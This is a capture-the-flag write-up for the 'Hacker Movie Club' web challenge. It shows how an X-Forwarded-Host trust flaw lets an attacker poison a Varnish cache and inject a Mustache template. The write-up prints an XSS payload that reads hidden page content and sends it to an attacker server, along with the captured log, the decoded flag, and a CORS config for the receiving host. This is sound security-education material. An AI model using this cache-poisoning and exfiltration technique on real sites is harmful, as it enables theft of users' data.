## Hacker Movie Club  
Author: itszn @ ret2sys  

### Description  
Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.  

### Solution  
by taking a look at index page, we notice `cdn.js` script:  

```javascript
for (let t of document.head.children) {
    if (t.tagName !== 'SCRIPT')
        continue;
    let { cdn, src } = t.dataset;
    if (cdn === undefined || src === undefined)
        continue;
    fetch(`//${cdn}/cdn/${src}`,{
        headers: {
            'X-Forwarded-Host':cdn
        }}
    ).then(r=>r.blob()).then(b=> {
        let u = URL.createObjectURL(b);
        let s = document.createElement('script');
        s.src = u;
        document.head.appendChild(s);
    });
}
```  

basically if `X-Forwarded-Host` header has been added in the request, it will fetch cdn domain from address has been provided in the header.  

There're two scripts appended to page:  

```
<script data-src="mustache.min.js" data-cdn="d00e59b0157127fc05d6cbfb3db0f8932731d95c.hm.vulnerable.services"></script>
<script data-src="app.js" data-cdn="d00e59b0157127fc05d6cbfb3db0f8932731d95c.hm.vulnerable.services"></script>
```  

app.js path is located at: `/{{domain}}/cdn/app.js` which domain is a hash generated the first time you connect to server which acts as a sandbox. code for that is here:  

```javascript
var token = null;

Promise.all([
    fetch('/api/movies').then(r=>r.json()),
    fetch(`//e6e918d1bcaf8d4340fd357948c5195cb2dad077.hm.vulnerable.services/cdn/main.mst`).then(r=>r.text()),
    new Promise((resolve) => {
        if (window.loaded_recapcha === true)
            return resolve();
        window.loaded_recapcha = resolve;
    }),
    new Promise((resolve) => {
        if (window.loaded_mustache === true)
            return resolve();
        window.loaded_mustache = resolve;
    })
]).then(([user, view])=>{
    document.getElementById('content').innerHTML = Mustache.render(view,user);

    grecaptcha.render(document.getElementById("captcha"), {
        sitekey: '6Lc8ymwUAAAAAM7eBFxU1EBMjzrfC5By7HUYUud5',
        theme: 'dark',
        callback: t=> {
            token = t;
            document.getElementById('report').disabled = false;
        }
    });
    let hidden = true;
    document.getElementById('report').onclick = () => {
        if (hidden) {
          document.getElementById("captcha").parentElement.style.display='block';
          document.getElementById('report').disabled = true;
          hidden = false;
          return;
        }
        fetch('/api/report',{
            method: 'POST',
            body: JSON.stringify({token:token})
        }).then(r=>r.json()).then(j=>{
            if (j.success) {
                // The admin is on her way to check the page
                alert("Neo... nobody has ever done this before.");
                alert("That's why it's going to work.");
            } else {
                alert("Dodge this.");
            }
        });
    }
});
```  

since server uses varnish for caching, cache key in basic config is only URI. So we need to wait for cache `Max-age` response header to timeout, then if we send request with `X-Forwarded-Host` set our server ip address, we can poison this cache.  

to make things automatic, I wrote a script in python to send requests to `/cdn/app.js` during some time intervals `120-{{age}}`. As we can see, the only field of `app.js` which is under control by that header is the part fetching a mustachejs `main.mst` template.  

Next step is to load the contents of `/api/movies` and grabbing the one with `admin_only` set to True and grabbing name of that movie which gonna be our flag cuz its value is `"[REDACTED]"` for us.  

so I appended this code at the end of `name.mst` file:  

```html
<img src=x onerror="var xhr=new XMLHttpRequest(); xhr.open('GET', 'http://{{server_ip}}/cookie.php?c='+ btoa(document.getElementsByClassName('movies')[0].rows[16].cells[0].innerHTML), false); xhr.send();">
```  

and wait until admin checkout our page and see result in logs:  

```
216.165.2.32 - - [17/Sep/2018:17:28:27 -0700] "GET /cookie.php?c=ZmxhZ3tJX2gwcGVfeW91X3c0dGNoM2RfYTExX3RoM19tMHYxZXN9 HTTP/1.1" 200 429 "http://d00e59b0157127fc05d6cbfb3db0f8932731d95c.hm.vulnerable.services/admin/view/d00e59b0157127fc05d6cbfb3db0f8932731d95c" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36"
```  

Flag is in base64 which after decoding we gonna have it:  

```python
In [15]: base64.b64decode('ZmxhZ3tJX2gwcGVfeW91X3c0dGNoM2RfYTExX3RoM19tMHYxZXN9')
Out[15]: 'flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es}'
```  

## server config  
you also need to enable CORS headers on your Apache configuration. So any XHR or fetch request from other hosts to your host destination will be allowed by browser.  

```xml
<Directory /var/www>
    Header set Access-Control-Allow-Origin "https://s.codepen.io"
</Directory>
```  

Sincerely,  
Mohsen (@pwnslinger) from @shellphish  
